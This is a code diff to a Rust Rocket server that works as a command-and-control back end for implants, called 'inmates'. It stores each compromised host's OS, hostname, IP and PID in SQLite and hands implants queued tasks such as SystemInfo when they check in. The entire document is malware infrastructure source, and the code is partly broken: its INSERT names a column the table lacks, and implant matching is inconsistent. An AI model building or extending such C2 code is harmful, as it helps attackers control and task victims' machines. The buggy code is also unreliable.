@@ -3,25 +3,46 @@ extern crate Justice;
 use rocket::serde::{Deserialize, Serialize, json::Json};
 use rand::random;
 use rocket::Response;
-use Justice::{C2Request, C2Response};
+use rocket::Request;
+use Justice::actions::c2_actions;
+use Justice::CheckInResponse;
+use Justice::PostRequest;
+use Justice::Inmate;
 use Justice::actions::{ResponseActionType, RequestActionType};
-use turbosql::{Turbosql,select,execute};
+use rusqlite::{Connection, Result, params};
+use std::time::SystemTime;
 
-#[derive(Turbosql, Default)]
-struct Inmate {
-    rowid: Option<i64>,
-    implant_id: Option<String>,
-    implant_type: Option<String>,
-    implant_version: Option<String>,
-    implant_os: Option<String>,
-    implant_arch: Option<String>,
-    implant_hostname: Option<String>,
-    implant_username: Option<String>,
-    implant_ip: Option<String>,
-    implant_pid: Option<i64>,
-    implant_last_checkin: Option<u32>,
-    pending_instruct: Option<String>,
-    pending_instruct_type: Option<ResponseActionType>,
+
+
+fn create_db() {
+    let conn = Connection::open("prisoninmates.db");
+    match conn {
+        Ok(conn) => {
+           match conn.execute(
+                "CREATE TABLE IF NOT EXISTS inmates (
+                    rowid INTEGER PRIMARY KEY,
+                    os TEXT,
+                    hostname TEXT,
+                    ip TEXT,
+                    pid INTEGER,
+                    last_checkin INTEGER,
+                    pending_instruct TEXT,
+                    pending_instruct_type TEXT
+                )",
+                [],
+            ) {
+                Ok(_) => {
+                    {}
+                }
+                Err(_) => {
+                    panic!("Error creating table");
+                }
+            }
+        },
+        Err(_) => {
+            panic!("Error creating database, make sure you can write a file to the current directory, or modify the path");
+        }
+    }
 }
 
 #[get("/")]
@@ -30,62 +51,57 @@ fn index() -> &'static str {
 }
 
 #[post("/c2/<implant_id>", data = "<c2_request>")]
-fn handle_c2_request(implant_id: String, c2_request: Json<Justice::C2Request>) -> &'static str {
-    println!("Implant ID: {}", implant_id);
-    println!("Action Type: {:?}", c2_request.message_headers.action_type);
-    println!("Timestamp: {}", c2_request.message_headers.timestamp);
-    "Hello, world!"
+fn handle_c2_request(implant_id: &str, c2_request: Json<PostRequest>) -> &'static str {
+    /* TODO */
+    return "ok";
 }
 
 #[get("/c2/<implant_id>")] 
-fn get_c2_request(implant_id: String) -> Json<C2Response> {
-    let inmateRow: Result<Inmate, _> = select!(Inmate "where implant_id =" implant_id);
-    match inmateRow {
-        Ok(inmate) => {
-            match inmate.pending_instruct {
-                Some(instruct) => {
-                    return Json(C2Response::new(
-                        inmate.implant_id.unwrap(),
-                        std::time::SystemTime::now()
-                            .duration_since(std::time::UNIX_EPOCH)
-                            .expect("Time went backwards")
-                            .as_secs() as u64,
-                        inmate.pending_instruct_type.unwrap(),
-                        instruct,
-                    ));
-                },
-                None => {
-                    println!("No pending instructions for {}", implant_id);
-                }
-            }
-        },
-        Err(e) => {
-            // Inmate not found, needs to register
-            let rowid = Inmate {
-                rowid: Some(rand::random::<i64>()),
-                implant_id: Some(implant_id.clone()),
-                implant_type: None,
-                implant_version: None,
-                implant_os: None,
-                implant_arch: None,
-                implant_hostname: None,
-                implant_username: None,
-                implant_ip: None,
-                implant_pid: None,
-                implant_last_checkin: Some(std::time::SystemTime::now()
-                    .duration_since(std::time::UNIX_EPOCH)
-                    .expect("Time went backwards")
-                    .as_secs() as u32),
-                pending_instruct: Some("SystemInfo".to_string()),
-                pending_instruct_type: Some(ResponseActionType::CallAction),
-
-            }.insert()?;
+fn get_c2_request(implant_id: String) -> Json<CheckInResponse> {
+    
+    let conn = Connection::open("prisoninmates.db").unwrap();
+    let mut stmt = conn.prepare("SELECT * FROM inmates").unwrap();
+    let mut inmate_iter = stmt.query_map([], |row| {
+        let instr_type: String = row.get(7)?;
+        Ok(Inmate {
+            rowid: row.get(0)?,
+            os: row.get(1)?,
+            hostname: row.get(2)?,
+            ip: row.get(3)?,
+            pid: row.get(4)?,
+            last_checkin: row.get(5)?,
+            pending_instruct: row.get(6)?,
+            pending_instruct_type: instr_type.parse::<c2_actions>().unwrap(),
+        })
+    }).unwrap();
+    for inmate in inmate_iter {
+        let inmate_unwrapped = inmate.unwrap();
+        if inmate_unwrapped.rowid.to_string() == implant_id {
+            let _ = conn.execute(
+                "UPDATE inmates SET pending_instruct = ?1, pending_instruct_type = ?2 WHERE rowid = ?3",
+                params!["", "wait", inmate_unwrapped.rowid]
+            );
+            return Json(CheckInResponse {
+                task: inmate_unwrapped.pending_instruct_type,
+                task_parameters: inmate_unwrapped.pending_instruct,
+            });
         }
-    };
+    }
+
+    let _ = conn.execute(
+        "INSERT INTO inmates (id, os, hostname, ip, pid, last_checkin, pending_instruct, pending_instruct_type) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
+        params![implant_id, "Unknown", "Unknown", "TBD", 1234, SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap().as_secs(), "", "Wait"]
+    );
+    return Json(CheckInResponse {
+        task: c2_actions::SystemInfo,
+        task_parameters: "".to_string(),
+    });
+
 }
 
 #[launch]
 fn rocket() -> _ {
+    create_db();
     rocket::build()
         .mount("/", routes![index])
         .mount("/", routes![handle_c2_request])
